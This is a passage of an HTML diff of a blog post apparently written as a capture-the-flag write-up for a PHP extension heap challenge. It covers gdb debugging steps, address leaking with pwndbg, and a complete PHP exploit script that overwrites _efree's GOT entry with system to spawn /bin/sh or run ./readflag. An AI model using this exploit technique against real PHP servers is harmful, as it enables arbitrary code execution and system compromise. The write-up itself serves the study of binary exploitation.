 <p>That`s quite a complex structure, if we replace the meaningless <code>__int64 xx</code> with corresponding zend data type, then it will be easier to comprehend.</p>
 <p>by the way, the form of parameters looks weird</p>
 <p><img src="/../img/php-pwn.assets/image-20230914225045011.png" alt="image-20230914225045011"></p>
@@ -115,35 +287,91 @@
 <p><code>zif_add_note</code> also contains an off by NULL Vulnerability.But who cares?</p>
 <h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>Since Partial RELRO is on, we can overwrite GOT table. Before that, we must leak the address of heap.so and libc.so.</p>
 <h3 id="Debuging-Tricks"><a href="#Debuging-Tricks" class="headerlink" title="Debuging Tricks"></a>Debuging Tricks</h3><p>To load the target extension, you should put the extension in correct path. To find the path, run</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">php -i | grep -i extension_dir</span></span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">$ php -i | grep -i extension_dir
+</code></pre>
 <p>And modify the php.ini file. You can <code>find</code> it in root directory.</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> find / -name <span class="string">&quot;php.ini&quot;</span></span></span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">$ sudo find / -name &quot;php.ini&quot;
+</code></pre>
 <p>Add the config at the file end</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extension=heaphp.so</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">extension=heaphp.so
+</code></pre>
 <p>After that, you can check if it`s properly loaded by <code>phpinfo</code> or checking the <code>/proc/[pid]/maps</code> when running php.</p>
 <p>To debug the extension, we run php with gdb attached first</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gdb php</span></span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">$ gdb php
+</code></pre>
 <p>Then we <code>run</code> it and press <code>Ctrl+c</code> to interrupt it. Check the <code>vmmap</code> , you may find heaphp.so is loaded.</p>
 <p>We can set breakpoints now. Don&#96;t forget to set our exploit script as argument.</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">set</span> args ./exp.php</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">b zif_add_notes</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">run</span></span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">$ set args ./exp.php
+$ b zif_add_notes
+$ run
+</code></pre>
 <p>You can also write them in a gdb script.</p>
 <h2 id="Address-Leak"><a href="#Address-Leak" class="headerlink" title="Address Leak"></a>Address Leak</h2><p>Through overwrite the content pointer of any notes, we may get content of arbitrary address through <code>zif_view_note</code>.</p>
 <p>First step, we can leak an fd pointer (by <code>zif_view_note</code> or <code>zif_list_note</code> ). Our heap memory was allocated by mmap anonymously, it doesn&#96;t have a constant offset with libc.so or heaphp.so.</p>
 <p><img src="/../img/php-pwn.assets/image-20230915150945514.png" alt="image-20230915150945514"></p>
 <p>However, we may find a pointer related to libc.so or heaphp.so on the heap. It could be extremely hard to find one through analyzing the source code. But I found a useful tool in pwndbg.</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usage: leakfind [-h] [-p [PAGE_NAME]] [-o [MAX_OFFSET]] [-d [MAX_DEPTH]] [-s [STEP]] [--negative_offset [NEGATIVE_OFFSET]] address</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">usage: leakfind [-h] [-p [PAGE_NAME]] [-o [MAX_OFFSET]] [-d [MAX_DEPTH]] [-s [STEP]] [--negative_offset [NEGATIVE_OFFSET]] address
+</code></pre>
 <p><code>leakfind</code> is a powerful tool to leak address given a starting address, then we can find some libc pointers on the heap.</p>
 <p><img src="/../img/php-pwn.assets/image-20230915151632552.png" alt="image-20230915151632552"></p>
 <p>On obtaining the libc address, we get heaphp.so address since they have constant offset, then we can overwrite the <code>_efree@got.plt</code> on the heaphp.so with the actual address of <code>system</code>  on libc.so.</p>
 <h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p>It`s not the final edition because functions like <code>chr()</code> are banned in the docker, and getting shell is usually not allowed in PHP pwn. I preserved them to make it more readable.</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">// function mychr($index)&#123;</span></span><br><span class="line">	<span class="comment">// 	return [&#x27;\x00&#x27;, &#x27;\x01&#x27;, &#x27;\x02&#x27;, &#x27;\x03&#x27;, &#x27;\x04&#x27;, &#x27;\x05&#x27;, &#x27;\x06&#x27;, &#x27;\x07&#x27;, &#x27;\x08&#x27;, &#x27;\t&#x27;, &#x27;\n&#x27;, &#x27;\x0b&#x27;, &#x27;\x0c&#x27;, &#x27;\r&#x27;, &#x27;\x0e&#x27;, &#x27;\x0f&#x27;, &#x27;\x10&#x27;, &#x27;\x11&#x27;, &#x27;\x12&#x27;, &#x27;\x13&#x27;, &#x27;\x14&#x27;, &#x27;\x15&#x27;, &#x27;\x16&#x27;, &#x27;\x17&#x27;, &#x27;\x18&#x27;, &#x27;\x19&#x27;, &#x27;\x1a&#x27;, &#x27;\x1b&#x27;, &#x27;\x1c&#x27;, &#x27;\x1d&#x27;, &#x27;\x1e&#x27;, &#x27;\x1f&#x27;, &#x27; &#x27;, &#x27;!&#x27;, &#x27;&quot;&#x27;, &#x27;#&#x27;, &#x27;$&#x27;, &#x27;%&#x27;, &#x27;&amp;&#x27;, &quot;&#x27;&quot;, &#x27;(&#x27;, &#x27;)&#x27;, &#x27;*&#x27;, &#x27;+&#x27;, &#x27;,&#x27;, &#x27;-&#x27;, &#x27;.&#x27;, &#x27;/&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;, &#x27;:&#x27;, &#x27;;&#x27;, &#x27;&lt;&#x27;, &#x27;=&#x27;, &#x27;&gt;&#x27;, &#x27;?&#x27;, &#x27;@&#x27;, &#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;, &#x27;G&#x27;, &#x27;H&#x27;, &#x27;I&#x27;, &#x27;J&#x27;, &#x27;K&#x27;, &#x27;L&#x27;, &#x27;M&#x27;, &#x27;N&#x27;, &#x27;O&#x27;, &#x27;P&#x27;, &#x27;Q&#x27;, &#x27;R&#x27;, &#x27;S&#x27;, &#x27;T&#x27;, &#x27;U&#x27;, &#x27;V&#x27;, &#x27;W&#x27;, &#x27;X&#x27;, &#x27;Y&#x27;, &#x27;Z&#x27;, &#x27;[&#x27;, &#x27;\\&#x27;, &#x27;]&#x27;, &#x27;^&#x27;, &#x27;_&#x27;, &#x27;`&#x27;, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27;, &#x27;i&#x27;, &#x27;j&#x27;, &#x27;k&#x27;, &#x27;l&#x27;, &#x27;m&#x27;, &#x27;n&#x27;, &#x27;o&#x27;, &#x27;p&#x27;, &#x27;q&#x27;, &#x27;r&#x27;, &#x27;s&#x27;, &#x27;t&#x27;, &#x27;u&#x27;, &#x27;v&#x27;, &#x27;w&#x27;, &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;, &#x27;&#123;&#x27;, &#x27;|&#x27;, &#x27;&#125;&#x27;, &#x27;~&#x27;, &#x27;\x7f&#x27;, &#x27;\x80&#x27;, &#x27;\x81&#x27;, &#x27;\x82&#x27;, &#x27;\x83&#x27;, &#x27;\x84&#x27;, &#x27;\x85&#x27;, &#x27;\x86&#x27;, &#x27;\x87&#x27;, &#x27;\x88&#x27;, &#x27;\x89&#x27;, &#x27;\x8a&#x27;, &#x27;\x8b&#x27;, &#x27;\x8c&#x27;, &#x27;\x8d&#x27;, &#x27;\x8e&#x27;, &#x27;\x8f&#x27;, &#x27;\x90&#x27;, &#x27;\x91&#x27;, &#x27;\x92&#x27;, &#x27;\x93&#x27;, &#x27;\x94&#x27;, &#x27;\x95&#x27;, &#x27;\x96&#x27;, &#x27;\x97&#x27;, &#x27;\x98&#x27;, &#x27;\x99&#x27;, &#x27;\x9a&#x27;, &#x27;\x9b&#x27;, &#x27;\x9c&#x27;, &#x27;\x9d&#x27;, &#x27;\x9e&#x27;, &#x27;\x9f&#x27;, &#x27;\xa0&#x27;, &#x27;¡&#x27;, &#x27;¢&#x27;, &#x27;£&#x27;, &#x27;¤&#x27;, &#x27;¥&#x27;, &#x27;¦&#x27;, &#x27;§&#x27;, &#x27;¨&#x27;, &#x27;©&#x27;, &#x27;ª&#x27;, &#x27;«&#x27;, &#x27;¬&#x27;, &#x27;\xad&#x27;, &#x27;®&#x27;, &#x27;¯&#x27;, &#x27;°&#x27;, &#x27;±&#x27;, &#x27;²&#x27;, &#x27;³&#x27;, &#x27;´&#x27;, &#x27;µ&#x27;, &#x27;¶&#x27;, &#x27;·&#x27;, &#x27;¸&#x27;, &#x27;¹&#x27;, &#x27;º&#x27;, &#x27;»&#x27;, &#x27;¼&#x27;, &#x27;½&#x27;, &#x27;¾&#x27;, &#x27;¿&#x27;, &#x27;À&#x27;, &#x27;Á&#x27;, &#x27;Â&#x27;, &#x27;Ã&#x27;, &#x27;Ä&#x27;, &#x27;Å&#x27;, &#x27;Æ&#x27;, &#x27;Ç&#x27;, &#x27;È&#x27;, &#x27;É&#x27;, &#x27;Ê&#x27;, &#x27;Ë&#x27;, &#x27;Ì&#x27;, &#x27;Í&#x27;, &#x27;Î&#x27;, &#x27;Ï&#x27;, &#x27;Ð&#x27;, &#x27;Ñ&#x27;, &#x27;Ò&#x27;, &#x27;Ó&#x27;, &#x27;Ô&#x27;, &#x27;Õ&#x27;, &#x27;Ö&#x27;, &#x27;×&#x27;, &#x27;Ø&#x27;, &#x27;Ù&#x27;, &#x27;Ú&#x27;, &#x27;Û&#x27;, &#x27;Ü&#x27;, &#x27;Ý&#x27;, &#x27;Þ&#x27;, &#x27;ß&#x27;, &#x27;à&#x27;, &#x27;á&#x27;, &#x27;â&#x27;, &#x27;ã&#x27;, &#x27;ä&#x27;, &#x27;å&#x27;, &#x27;æ&#x27;, &#x27;ç&#x27;, &#x27;è&#x27;, &#x27;é&#x27;, &#x27;ê&#x27;, &#x27;ë&#x27;, &#x27;ì&#x27;, &#x27;í&#x27;, &#x27;î&#x27;, &#x27;ï&#x27;, &#x27;ð&#x27;, &#x27;ñ&#x27;, &#x27;ò&#x27;, &#x27;ó&#x27;, &#x27;ô&#x27;, &#x27;õ&#x27;, &#x27;ö&#x27;, &#x27;÷&#x27;, &#x27;ø&#x27;, &#x27;ù&#x27;, &#x27;ú&#x27;, &#x27;û&#x27;, &#x27;ü&#x27;, &#x27;ý&#x27;, &#x27;þ&#x27;, &#x27;ÿ&#x27;][$index];</span></span><br><span class="line">	<span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">tobytes</span>(<span class="params"><span class="variable">$integerValue</span>, <span class="variable">$byteLength</span></span>) </span>&#123;</span><br><span class="line">	    <span class="variable">$byteString</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$byteLength</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">	        <span class="variable">$byteString</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$integerValue</span> &amp; <span class="number">0xFF</span>);</span><br><span class="line">	        <span class="variable">$integerValue</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	    <span class="keyword">return</span> <span class="variable">$byteString</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="title function_ invoke__">add_note</span>(<span class="string">&quot;number0&quot;</span>,<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa&quot;</span>);</span><br><span class="line">	<span class="title function_ invoke__">add_note</span>(<span class="string">&quot;number1&quot;</span>,<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa&quot;</span>);</span><br><span class="line">	<span class="title function_ invoke__">delete_note</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">add_note</span>(<span class="string">&quot;number0&quot;</span>,<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaa\x00/bin/shacaaadaaaeaaafaaagaaahaaaiaaajaaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$fd</span>=<span class="title function_ invoke__">list_note</span>();</span><br><span class="line">	<span class="variable">$fd</span> = <span class="variable">$fd</span>[<span class="number">1</span>];</span><br><span class="line">	<span class="variable">$decimalValue</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt;= <span class="number">6</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">	    <span class="variable">$char</span> = <span class="variable">$fd</span>[-<span class="variable">$i</span>];</span><br><span class="line">	    <span class="variable">$digit</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$char</span>);</span><br><span class="line">	    <span class="variable">$decimalValue</span> = (<span class="variable">$decimalValue</span> &lt;&lt; <span class="number">8</span>) | <span class="variable">$digit</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$heap_base</span> = <span class="variable">$decimalValue</span> - <span class="number">0x1480</span>;</span><br><span class="line">	<span class="variable">$target_libc</span> = <span class="variable">$heap_base</span> + <span class="number">0x82000</span>; </span><br><span class="line"></span><br><span class="line">	<span class="title function_ invoke__">delete_note</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">add_note</span>(<span class="string">&quot;number0&quot;</span>,<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaa\x00aaaabaaacaaadaaaeaaafaaagaaahaaa\xff\x00\x00\x00\x00\x00\x00\x00&quot;</span> . <span class="title function_ invoke__">tobytes</span>(<span class="variable">$target_libc</span>,<span class="number">8</span>));</span><br><span class="line">	<span class="variable">$libc_off</span> = <span class="title function_ invoke__">view_note</span>(<span class="number">1</span>);</span><br><span class="line">	<span class="variable">$libc</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">5</span>; <span class="variable">$i</span> &gt;= <span class="number">0</span>; <span class="variable">$i</span>--) &#123;</span><br><span class="line">	    <span class="variable">$char</span> = <span class="variable">$libc_off</span>[<span class="variable">$i</span>];</span><br><span class="line">	    <span class="variable">$digit</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$char</span>);</span><br><span class="line">	    <span class="variable">$libc</span> = (<span class="variable">$libc</span> &lt;&lt; <span class="number">8</span>) | <span class="variable">$digit</span>;</span><br><span class="line">	&#125;	</span><br><span class="line">	<span class="variable">$libc</span> -= <span class="number">0x219aa0</span>;</span><br><span class="line">	<span class="title function_ invoke__">printf</span>(<span class="string">&quot;%x&quot;</span>,<span class="variable">$libc</span>);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$heaphp_base</span> = <span class="variable">$libc</span> + <span class="number">0x7af000</span>;</span><br><span class="line">	<span class="variable">$sys_addr</span> = <span class="variable">$libc</span> + <span class="number">0x50d60</span>;</span><br><span class="line">	<span class="variable">$efree_got_addr</span> = <span class="variable">$heaphp_base</span> + <span class="number">0x4058</span>;</span><br><span class="line">	<span class="title function_ invoke__">delete_note</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">add_note</span>(<span class="string">&quot;number0&quot;</span>,<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaa\x00aaaabaaacaaadaaaeaaafaaagaaahaaa\xff\x00\x00\x00\x00\x00\x00\x00&quot;</span> . <span class="title function_ invoke__">tobytes</span>(<span class="variable">$efree_got_addr</span>,<span class="number">8</span>));</span><br><span class="line">	<span class="title function_ invoke__">add_note</span>(<span class="string">&quot;./readflag&quot;</span>,<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">	<span class="title function_ invoke__">edit_note</span>(<span class="number">1</span>,<span class="title function_ invoke__">tobytes</span>(<span class="variable">$sys_addr</span>,<span class="number">8</span>));</span><br><span class="line">	<span class="title function_ invoke__">delete_note</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span>	</span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+    // function mychr($index)&#123;
+    // 	return [&#39;\x00&#39;, &#39;\x01&#39;, &#39;\x02&#39;, &#39;\x03&#39;, &#39;\x04&#39;, &#39;\x05&#39;, &#39;\x06&#39;, &#39;\x07&#39;, &#39;\x08&#39;, &#39;\t&#39;, &#39;\n&#39;, &#39;\x0b&#39;, &#39;\x0c&#39;, &#39;\r&#39;, &#39;\x0e&#39;, &#39;\x0f&#39;, &#39;\x10&#39;, &#39;\x11&#39;, &#39;\x12&#39;, &#39;\x13&#39;, &#39;\x14&#39;, &#39;\x15&#39;, &#39;\x16&#39;, &#39;\x17&#39;, &#39;\x18&#39;, &#39;\x19&#39;, &#39;\x1a&#39;, &#39;\x1b&#39;, &#39;\x1c&#39;, &#39;\x1d&#39;, &#39;\x1e&#39;, &#39;\x1f&#39;, &#39; &#39;, &#39;!&#39;, &#39;&quot;&#39;, &#39;#&#39;, &#39;$&#39;, &#39;%&#39;, &#39;&amp;&#39;, &quot;&#39;&quot;, &#39;(&#39;, &#39;)&#39;, &#39;*&#39;, &#39;+&#39;, &#39;,&#39;, &#39;-&#39;, &#39;.&#39;, &#39;/&#39;, &#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;:&#39;, &#39;;&#39;, &#39;&lt;&#39;, &#39;=&#39;, &#39;&gt;&#39;, &#39;?&#39;, &#39;@&#39;, &#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;, &#39;E&#39;, &#39;F&#39;, &#39;G&#39;, &#39;H&#39;, &#39;I&#39;, &#39;J&#39;, &#39;K&#39;, &#39;L&#39;, &#39;M&#39;, &#39;N&#39;, &#39;O&#39;, &#39;P&#39;, &#39;Q&#39;, &#39;R&#39;, &#39;S&#39;, &#39;T&#39;, &#39;U&#39;, &#39;V&#39;, &#39;W&#39;, &#39;X&#39;, &#39;Y&#39;, &#39;Z&#39;, &#39;[&#39;, &#39;\\&#39;, &#39;]&#39;, &#39;^&#39;, &#39;_&#39;, &#39;`&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;, &#39;n&#39;, &#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;v&#39;, &#39;w&#39;, &#39;x&#39;, &#39;y&#39;, &#39;z&#39;, &#39;&#123;&#39;, &#39;|&#39;, &#39;&#125;&#39;, &#39;~&#39;, &#39;\x7f&#39;, &#39;\x80&#39;, &#39;\x81&#39;, &#39;\x82&#39;, &#39;\x83&#39;, &#39;\x84&#39;, &#39;\x85&#39;, &#39;\x86&#39;, &#39;\x87&#39;, &#39;\x88&#39;, &#39;\x89&#39;, &#39;\x8a&#39;, &#39;\x8b&#39;, &#39;\x8c&#39;, &#39;\x8d&#39;, &#39;\x8e&#39;, &#39;\x8f&#39;, &#39;\x90&#39;, &#39;\x91&#39;, &#39;\x92&#39;, &#39;\x93&#39;, &#39;\x94&#39;, &#39;\x95&#39;, &#39;\x96&#39;, &#39;\x97&#39;, &#39;\x98&#39;, &#39;\x99&#39;, &#39;\x9a&#39;, &#39;\x9b&#39;, &#39;\x9c&#39;, &#39;\x9d&#39;, &#39;\x9e&#39;, &#39;\x9f&#39;, &#39;\xa0&#39;, &#39;¡&#39;, &#39;¢&#39;, &#39;£&#39;, &#39;¤&#39;, &#39;¥&#39;, &#39;¦&#39;, &#39;§&#39;, &#39;¨&#39;, &#39;©&#39;, &#39;ª&#39;, &#39;«&#39;, &#39;¬&#39;, &#39;\xad&#39;, &#39;®&#39;, &#39;¯&#39;, &#39;°&#39;, &#39;±&#39;, &#39;²&#39;, &#39;³&#39;, &#39;´&#39;, &#39;µ&#39;, &#39;¶&#39;, &#39;·&#39;, &#39;¸&#39;, &#39;¹&#39;, &#39;º&#39;, &#39;»&#39;, &#39;¼&#39;, &#39;½&#39;, &#39;¾&#39;, &#39;¿&#39;, &#39;À&#39;, &#39;Á&#39;, &#39;Â&#39;, &#39;Ã&#39;, &#39;Ä&#39;, &#39;Å&#39;, &#39;Æ&#39;, &#39;Ç&#39;, &#39;È&#39;, &#39;É&#39;, &#39;Ê&#39;, &#39;Ë&#39;, &#39;Ì&#39;, &#39;Í&#39;, &#39;Î&#39;, &#39;Ï&#39;, &#39;Ð&#39;, &#39;Ñ&#39;, &#39;Ò&#39;, &#39;Ó&#39;, &#39;Ô&#39;, &#39;Õ&#39;, &#39;Ö&#39;, &#39;×&#39;, &#39;Ø&#39;, &#39;Ù&#39;, &#39;Ú&#39;, &#39;Û&#39;, &#39;Ü&#39;, &#39;Ý&#39;, &#39;Þ&#39;, &#39;ß&#39;, &#39;à&#39;, &#39;á&#39;, &#39;â&#39;, &#39;ã&#39;, &#39;ä&#39;, &#39;å&#39;, &#39;æ&#39;, &#39;ç&#39;, &#39;è&#39;, &#39;é&#39;, &#39;ê&#39;, &#39;ë&#39;, &#39;ì&#39;, &#39;í&#39;, &#39;î&#39;, &#39;ï&#39;, &#39;ð&#39;, &#39;ñ&#39;, &#39;ò&#39;, &#39;ó&#39;, &#39;ô&#39;, &#39;õ&#39;, &#39;ö&#39;, &#39;÷&#39;, &#39;ø&#39;, &#39;ù&#39;, &#39;ú&#39;, &#39;û&#39;, &#39;ü&#39;, &#39;ý&#39;, &#39;þ&#39;, &#39;ÿ&#39;][$index];
+    // &#125;
 
+    function tobytes($integerValue, $byteLength) &#123;
+        $byteString = &#39;&#39;;
+        for ($i = 0; $i &lt; $byteLength; $i++) &#123;
+            $byteString .= chr($integerValue &amp; 0xFF);
+            $integerValue &gt;&gt;= 8;
+        &#125;
+        return $byteString;
+    &#125;
+
+    add_note(&quot;number0&quot;,&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa&quot;);
+    add_note(&quot;number1&quot;,&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa&quot;);
+    delete_note(0);
+add_note(&quot;number0&quot;,&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaa\x00/bin/shacaaadaaaeaaafaaagaaahaaaiaaajaaa&quot;);
+
+    $fd=list_note();
+    $fd = $fd[1];
+    $decimalValue = 0;
+
+    for ($i = 1; $i &lt;= 6; $i++) &#123;
+        $char = $fd[-$i];
+        $digit = ord($char);
+        $decimalValue = ($decimalValue &lt;&lt; 8) | $digit;
+    &#125;
+    
+    $heap_base = $decimalValue - 0x1480;
+    $target_libc = $heap_base + 0x82000; 
+
+    delete_note(0);
+add_note(&quot;number0&quot;,&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaa\x00aaaabaaacaaadaaaeaaafaaagaaahaaa\xff\x00\x00\x00\x00\x00\x00\x00&quot; . tobytes($target_libc,8));
+    $libc_off = view_note(1);
+    $libc = 0;
+
+    for ($i = 5; $i &gt;= 0; $i--) &#123;
+        $char = $libc_off[$i];
+        $digit = ord($char);
+        $libc = ($libc &lt;&lt; 8) | $digit;
+    &#125;	
+    $libc -= 0x219aa0;
+    printf(&quot;%x&quot;,$libc);
+
+    $heaphp_base = $libc + 0x7af000;
+    $sys_addr = $libc + 0x50d60;
+    $efree_got_addr = $heaphp_base + 0x4058;
+    delete_note(0);
+add_note(&quot;number0&quot;,&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaa\x00aaaabaaacaaadaaaeaaafaaagaaahaaa\xff\x00\x00\x00\x00\x00\x00\x00&quot; . tobytes($efree_got_addr,8));
+    add_note(&quot;./readflag&quot;,&quot;/bin/sh&quot;);
+    edit_note(1,tobytes($sys_addr,8));
+    delete_note(2);
+
+?&gt;	
+</code></pre>
 </main>
 
 </article>
